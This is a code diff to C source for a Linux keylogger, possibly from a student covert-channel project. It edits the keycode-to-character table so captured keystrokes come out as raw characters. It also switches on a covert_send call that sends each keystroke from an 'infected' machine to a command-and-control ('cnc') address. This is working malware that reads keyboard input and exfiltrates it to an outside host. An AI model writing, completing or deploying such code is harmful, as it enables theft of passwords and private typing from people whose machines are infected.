@@ -32,8 +32,8 @@ const char *keycodes[] = {
     "8",
     "9",
     "0",
-    " <MINUS> ",
-    " <EQUAL> ",
+    "-",
+    "=",
     " <BACKSPACE> ",
     " <TAB> ",
     "Q",
@@ -46,8 +46,8 @@ const char *keycodes[] = {
     "I",
     "O",
     "P",
-    " <LEFTBRACE> ",
-    " <RIGHTBRACE> ",
+    "{",
+    "}",
     " <ENTER> ",
     " <LEFTCTRL> ",
     "A",
@@ -59,11 +59,11 @@ const char *keycodes[] = {
     "J",
     "K",
     "L",
-    " <SEMICOLON> ",
-    " <APOSTROPHE> ",
+    ";",
+    "'",
     " <GRAVE> ",
     " <LEFTSHIFT> ",
-    " <BACKSLASH> ",
+    "\\",
     "Z",
     "X",
     "C",
@@ -71,13 +71,17 @@ const char *keycodes[] = {
     "B",
     "N",
     "M",
-    " <COMMA> ",
-    " <DOT> ",
-    " <SLASH> ",
+    //"<COMMA> ",
+    ",",
+    //" <DOT> ",
+    ".",
+    //" <SLASH> ",
+    "/",
     " <RIGHTSHIFT> ",
     " <KPASTERISK> ",
     " <LEFTALT> ",
-    " <SPACE> ",
+    //" <SPACE> ",
+    " ",
     " <CAPSLOCK> ",
     "F1",
     "F2",
@@ -180,7 +184,7 @@ void *keylogger_send(void *args_input) {
     int bytesRead = 0;
     struct input_event events[NUM_EVENTS];
     int j;
-    char ch[1];
+    unsigned char ch[1];
 
     while(loop != 0) {
         bytesRead = read(keyboard_fd, events, sizeof(struct input_event) * NUM_EVENTS);
@@ -200,8 +204,7 @@ void *keylogger_send(void *args_input) {
                             ch[0] = keycodes[events[i].code][j];
                             //printf("DEBUG: %c\n", keycodes[events[i].code][j]);
                             printf("DEBUG: %c\n", ch[0]);
-
-                            //covert_send(args->infected_ip, args->cnc_ip, KEYLOGGER_PORT, KEYLOGGER_PORT, (unsigned char*) keycodes[events[i].code], 1);
+                            covert_send(args->infected_ip, args->cnc_ip, KEYLOGGER_PORT, KEYLOGGER_PORT, (unsigned char*) ch, 1);
                             j++;
                         }
                     } else {
